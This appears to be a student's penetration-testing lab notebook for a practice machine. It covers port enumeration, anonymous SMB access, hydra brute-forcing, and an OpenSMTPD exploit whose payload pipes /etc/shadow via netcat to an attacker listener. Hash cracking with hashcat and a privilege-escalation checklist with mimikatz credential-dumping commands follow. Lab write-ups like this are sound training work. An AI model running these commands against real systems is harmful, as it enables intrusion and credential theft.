### Enumeration
```
IP=192.168.247.71
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,25,80,445 -A $IP
```
### Ports 
- 22
	- OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
- 25
	- OpenSMTPD 2
- 80
	- nginx 1.14.0 (Ubuntu)
- 445
	- Samba smbd 4.7.6-Ubuntu
### Foothold
- 21
	- ftp anonymous@$IP
	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
- 445
	- smbclient -N -L //$IP
		- anonymous login successful
		- shares
			- backups
				- passwd.bak
					- Backup of /etc/passwd
					- Valid users
					- root, neil, postgres
			- IPC$
	- nmap --script smb-vuln* -p135,139,445 $IP
		- Vulnerable to ddos
	- Put known users into users.txt
	- `hydra -L users.txt -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt smb://$IP`
		- no password found
	- `hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-500.txt smb://$IP`
		- no password found
- 80
	- Default landing page
		- ![[Pasted image 20240709083952.png]]
	- Versions
		- FlaskBB
	- Directory Brute force
		- dirsearch -u http://$IP
			- `/index.html`
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
- 25
	- Google opensmtpd 2.0.0 exploit
		- exploit-db 47984
			- Does not get rce
			- nc -lvnp 80
			- python3 47984.py 192.168.247.71 25 'nc -vn 192.168.45.195 80 < /etc/shadow'
			- This sends /etc/shadow to our nc listener
			- Then run 
				- unshadow root_passwd root_shadow  > root_unshadow
					- hashcat -m 1800 -a 0 root_unshadow /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
				- unshadow neil_passwd neil_shadow  > neil_unshadow
					- hashcat -m 1800 -a 0 neil_unshadow /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
			- Supposed to edit /etc/passwd then send it back to system
### PE
#### Linux
- USERNAME
	- id
	- sudo -l
	- uname -a
	- getcap -r / 2>/dev/null
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
	- Users with console
	- linpeas
#### Windows
- USERNAME
	- whoami /all
	- net user USERNAME
		- Check group memberships
	- systeminfo
	- history
		- (Get-PSReadLineOption).HistorySavePath
			- type PATH
	- Users with console
	- Unquoted
		- cmd
			- wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
		- PS1
			- Get-CimInstance -ClassName win32_service | Select Name,State,PathName
		- icacls Filepath before .exe
			- Looking for W or F
	- mimkatz
		- mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
		- mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
### Credentials
### Lessons Learned